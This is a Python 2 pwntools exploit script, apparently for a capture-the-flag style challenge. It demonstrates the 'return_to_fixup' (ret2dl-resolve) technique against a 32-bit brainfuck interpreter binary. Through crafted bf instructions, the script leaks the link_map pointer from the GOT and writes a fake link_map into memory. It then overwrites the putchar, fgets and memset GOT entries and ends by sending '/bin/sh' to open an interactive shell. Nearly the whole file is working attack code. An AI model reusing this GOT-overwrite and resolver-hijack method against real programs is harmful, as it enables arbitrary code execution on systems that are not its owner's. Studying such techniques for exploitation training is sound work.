"""
This is an example usage of return_to_fixup technique
Copyright (C) 2016-2017 WindAvid
Join us now, share software,
You'll be a free hacker!

This program is free software; you can redistribute it and/or
modify it under the terms of the GNU General Public License
as published by the Free Software Foundation; either version 2
of the License, or (at your option) any later version.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with this program; if not, write to the Free Software
Foundation, Inc., 51 Franklin Street, Fifth Floor, Boston, MA  02110-1301, USA.
"""

import argparse
from enum import Enum
from itertools import izip_longest
from time import sleep

from pwn import *
import pwn

from generate32_2 import create_link_map32_2

###############################################################################
# common routines for exploit development
def arg_parser(args=None, namespace=None):
    parser = argparse.ArgumentParser()

    #parser.add_argument('-v', action="store_true", help="verbosity")
    parser.add_argument('-d', action="store_true", help="print command to attatch with gdb")
    parser.add_argument('-a', action="store_true", help="attatch with gdb")
    parser.add_argument('-r', action="store_true", help="remote exploitation (default is local)")

    return parser

def gdb_break(sym):
    """
    return string s, that can be passed to gdb's break command
    sym can be string:
        b string
    int
        b *hex(int)
    tuple (label, line)
        b *(&label + line)
    """
    if isinstance(sym, tuple):
        label, line = sym
        assert isinstance(label, str), '0st of tuple must be string'
        assert isinstance(line, int), '1st of tuple must be integer'
        return '*(&{:s} + {:d})'.format(label, line)
    elif isinstance(sym, int):
        return '*0x%x' % sym
    assert isinstance(sym, str), 'unsupported sym type'
    return sym

def gdb_attatch(p, breaks, attatch=False):
    """
    p - pid (int) or process/remote
    """
    sbreaks = ' '.join('-ex \"b %s\"' % gdb_break(b) for b in breaks)  # read by def
    pid = p
    if not isinstance(pid, int):
        pid = pwn.util.proc.pidof(p)[0]
    gdb_cmd = "gdb -p %d %s -ex c" % (pid, sbreaks)
    print 'gdb cmd: |%s|' % gdb_cmd
    if attatch:
        os.system("tmux split-window '%s'" % gdb_cmd)

class Actions(str, Enum):
    """
    enumeration of bf interpretator possible actions
    """
    r = '>'     # move to right
    l = '<'     # move to left
    inc = '+'
    dec = '-'
    p = '.'     # putchar
    g = ','     # getchar

def interleave(str1, str2):
    """
    interleave('abcd', 'klm') -> 'akblcmd'
    """
    return ''.join(c for t in izip_longest(str1, str2, fillvalue='') for c in t)

class Generator(object):
    """
    class for more convenient payload generation for bf interpretator
    """
    def __init__(self, poend, got=None):
        self.poend = poend  # poend is caret position
        self.got = got      # just for debug information - address of GOT
        self.tape = poend   # this is original poend points to
        self.bits = 4

    def info(self):
        got_diff = self.poend - self.got
        tape_diff = self.poend - self.tape
        _info = '%s + {:s} (%s[{:d}] + {:d})'
        got_info = _info % ('got', 'got')
        got_info = got_info.format(hex(got_diff), *divmod(got_diff, self.bits))
        tape_info = _info % ('tape', 'tape')
        tape_info = tape_info.format(hex(tape_diff), *divmod(tape_diff, self.bits))
        return got_info + '\n' + tape_info


    def _char_move(self, char_act, count, direct, last_step):
        """
        make action on memory and move pointer after it
        last step signals, does caret stop on last action place, or next to it
        """
        assert direct in (-1, 1), "direction must be either 1, or -1"
        res_move = self.move(direct * (count - (not last_step)))
        res_char = ''.join(char_act for i in range(count))
        return interleave(res_char, res_move)

    def read(self, count, direct=1, last_step=True):
        """
        sequence of :putchar:move: actions
        """
        return self._char_move(Actions.p, count, direct, last_step)

    def write(self, count, direct=1, last_step=True):
        """
        sequence of :getchar:move: actions
        """
        return self._char_move(Actions.g, count, direct, last_step)

    def move(self, change, pchange=True):
        """
        move caret :change: times to right (change>0) or left
        """
        move_act = [Actions.l, Actions.r][change > 0]
        if pchange:
            self.poend += change
        return ''.join(move_act for i in range(abs(change)))


def test_interleave():
    assert interleave('abcd', 'klm') == 'akblcmd'
    assert interleave('abcdef', 'abcdef') == 'aabbccddeeff'
    print 'interleave tests passed'


def test_generator():
    poend = 100
    got = 80
    tape = 100
    g = Generator(poend, got)

    c1, d1 = 10, 1  # count, direction (left + /right -)
    poend += c1
    assert g.move(c1 * d1) == Actions.r * c1
    assert g.poend == poend


    c2, d2 = 5, -1
    poend -= c2
    assert g.move(c2 * d2) == Actions.l * c2
    assert g.poend == poend

    c3, d3 = 3, 1
    poend += c3
    r3 = g.read(c3, d3)
    assert r3 == '.>.>.>'
    assert g.poend == poend

    c4, d4 = 3, -1
    poend -= c4 - 1
    w4 = g.write(c4, d4, False)
    print w4
    assert  w4 == ',<,<,'
    assert g.poend == poend

    g = Generator(100, 80)
    print g.read(9, 1)
    print g.info()

    print 'generator tests passed'

delay = 0.5
local_target = './bf'
breaks = [
    0x08048774, # end of main
    0x0804878E,
    0x08048734, # fgets call
    0x08048700, # memset call
    ]

if __name__ == '__main__':
#    test_interleave()
#    test_generator()

    ###########################################################################
    # parse arguments, launch binary

    max_acts = 1023  # because buffer for actions on stack is 1024 bytes long
    args = arg_parser().parse_args()
    p = process(local_target)
    '''
    if args.d:
        gdb_attatch(p, breaks, args.a)
    '''

    raw_input('press something to continue')
    sleep(delay)
    print p.recv()

    ###########################################################################
    # <bf_file_constants>
    # addreses in main function
    va_main_memset = 0x08048700 # set arguments and call memset (main function)
    va_main_fgets = 0x0804871C  # set arguments and call fgets

    # indicies in GOT table
    ingot_putchar = 9 + 3       # PUTCHAR index in GOT table
    ingot_fgets = 1 + 3         # FGETS index
    ingot_memset = 8 + 3        # MEMSET index

    # addreses of global variables
    va_got = 0x0804A000         # address of GOT table
    va_poiner = 0x804a080       # addr of char *p, global pointer variable
    va_tape = 0x804a0a0         # addr of tape[1024]

    # other stuff
    reloc_arg = 0x8             # first reloc_arg for fake_link_map
    va_reloc_arg = 0x8048456    # addr of wrapper_fixup with push 0x8
    va_reloc_arg2 = 0x8048466   # addr of wrapper_fixup with push 0x10
    # </bf_file_constants>
    ###########################################################################

    # get address of got[i] element
    goti = lambda i: va_got + i * 4

    g = Generator(va_tape, va_got)

    ###########################################################################
    # 1 round and return to main
    a_mov1 = g.move(goti(1) - g.poend)
    print g.info()              # ensure, that we are on GOT[1]
    a_read1 = g.read(4, 1)
    print g.info()      # now we must be on GOT[2], sinse we've read one value
    a_mov2 = g.move(goti(ingot_putchar) - g.poend)
    print g.info()              # moved to GOT[PUTCHAR]
    a_write1 = g.write(4, 1)    # overwrite GOT[PUTHCAR]

    # 1 reads is enough, this is all we want to know
    # may overwrite putchar with address of va_main_fgets
    w_new_putchar = struct.pack('<I', va_main_fgets)
    # payload1: Actions.p on the end to return to va_main_fgets with overwritten putchar
    p.sendline(a_mov1 + a_read1 + a_mov2 + a_write1 + Actions.p)
    p.send(w_new_putchar)

    ###########################################################################
    # 2 round: read GOT[1] and craft link_map
    # 2.0 round ===============================================================
    sleep(delay)
    out1 = p.recv()     # contains all bytes that were putchar'ed in payload1
    print ' received:', out1
    # address of default link_map stored in GOT[1]
    old_link_map = struct.unpack('<I', out1)[0]
    print ' old link_map:', hex(old_link_map)

    # now go to tape and write our own link_map
    # TODO: don't getchar on 0's, they already are 0...
    acts2 = []
    acts2.append(g.move(va_tape - g.poend))
    print g.info()
    # payload2: move to start of tape and return to va_main_fgets
    p.sendline(''.join(acts2) + Actions.p)

    # 2.1 round ===============================================================
    # create linkmap structure and write it to tape
    fake_linkmap = create_link_map32_2(
            va_tape,                # address of crafted link_map
            old_link_map,           # address of default link_map
            goti(ingot_fgets),      # optional (may be NULL): where to store function address with reloc_arg
            reloc_arg,              # reloc_arg of first function
            goti(ingot_memset))     # optional (may be NULL): where to store function address with reloc_arg + 0x8
    print 'size of fake link_map', len(fake_linkmap)
    part1, part2 = fake_linkmap[:300], fake_linkmap[300:]

    acts3 = []
    acts3.append(g.write(len(part1), 1))
    # write 1/2 part of fake_linkmap and return to va_main_fgets
    p.sendline(''.join(acts3) + Actions.p)
    p.send(part1)

    # 2.2 round ================================================================
    # write 2/2 part of fake_linkmap
    acts3 = []
    acts3.append(g.write(len(part2), 1))
    p.sendline(''.join(acts3) + Actions.p)
    p.send(part2)

    ###########################################################################
    # 3 round: modify GOT table to final preexploitation state
    # 3.0 round ===============================================================
    act4 = g.move(goti(1) - g.poend)
    print 'now move back to got[1]'
    print g.info()
    assert len(act4) < max_acts - 1
    p.sendline(act4 + Actions.p)

    # 3.1 round ===============================================================
    # overwrite GOT[1] with address of fake_linkmap e.g. GOT[1] = &tape[0]
    acts5 = []
    acts5.append(g.write(4, 1))
    acts5.append(g.move(goti(ingot_fgets) - g.poend))
    print 'move to fgets got entry'
    print g.info()
    p.sendline(''.join(acts5) + Actions.p)
    p.send(struct.pack('<I', va_tape))

    # 3.2 round ===============================================================
    # GOT[FGETS] -> va_reloc_arg
    # GOT[MEMSET] -> va_reloc_arg2
    # GOT[PUTCHAR] -> va_main_memset
    acts6 = []
    # overwrite fgets
    acts6.append(g.write(4, 1))
    # overwrite memset
    acts6.append(g.move(goti(ingot_memset) - g.poend))
    acts6.append(g.write(4, 1))
    # overwrite putchar
    acts6.append(g.move(goti(ingot_putchar) - g.poend))
    acts6.append(g.write(4, 1))
    p.sendline(''.join(acts6) + Actions.p)
    # set memset points to push 0x10, fgets to push 0x8, puchar to prememset
    p.send(struct.pack('<III', va_reloc_arg, va_reloc_arg2, va_main_memset))

    ###########################################################################
    # GRAND FINAL: we in main, GOT table is ready, enter command we want
    p.sendline('/bin/sh')
    p.interactive()
